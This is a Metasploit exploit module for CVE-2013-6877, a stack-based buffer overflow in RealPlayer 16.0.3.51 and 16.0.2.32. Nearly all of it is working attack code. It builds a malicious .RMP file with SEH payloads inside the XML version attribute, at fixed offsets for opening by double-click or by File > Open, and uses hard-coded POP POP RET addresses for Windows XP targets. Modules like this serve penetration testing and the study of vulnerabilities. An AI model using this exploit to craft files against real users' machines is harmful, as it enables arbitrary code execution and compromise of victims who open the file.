##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'RealNetworks RealPlayer Version Attribute 
Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack-based buffer overflow vulnerability 
in
        version 16.0.3.51 and 16.0.2.32 of RealNetworks RealPlayer, 
caused by
        improper bounds checking of the version and encoding attributes 
inside
        the XML declaration.

        By persuading the victim to open a specially-crafted .RMP file, 
a
        remote attacker could execute arbitrary code on the system or 
cause
        the application to crash.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Gabor Seljan' # Vulnerability discovery and Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-6877' ],
          [ 'URL', 
'http://service.real.com/realplayer/security/12202013_player/en/' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'seh'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'  => "\x00\x22",
          'Space'     => 532,
        },
      'Targets'       =>
        [
          [ 'Windows XP SP2/SP3 (NX) / Real Player 16.0.3.51',
            {
              'OffsetClick' => 2540,       # Open via double click
              'OffsetMenu'  => 13600,      # Open via File -> Open
              'Ret'         => 0x641930C8  # POP POP RET from 
rpap3260.dll
            }
          ],
          [ 'Windows XP SP2/SP3 (NX) / Real Player 16.0.2.32',
            {
              'OffsetClick' => 2540,       # Open via double click
              'OffsetMenu'  => 13600,      # Open via File -> Open
              'Ret'         => 0x63A630B8  # POP POP RET from 
rpap3260.dll
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Dec 20 2013',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ false, 'The file name.', 
'msf.rmp'])
        ],
      self.class)

  end

  def exploit

    sploit =  rand_text_alpha_upper(target['OffsetClick'])
    sploit << generate_seh_payload(target.ret)
    sploit << rand_text_alpha_upper(target['OffsetMenu'] - 
sploit.length)
    sploit << generate_seh_payload(target.ret)
    sploit << rand_text_alpha_upper(17000) # Generate exception

    # Create the file
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    file_create("<?xml version=\"" + sploit + "\"?>")

  end
end
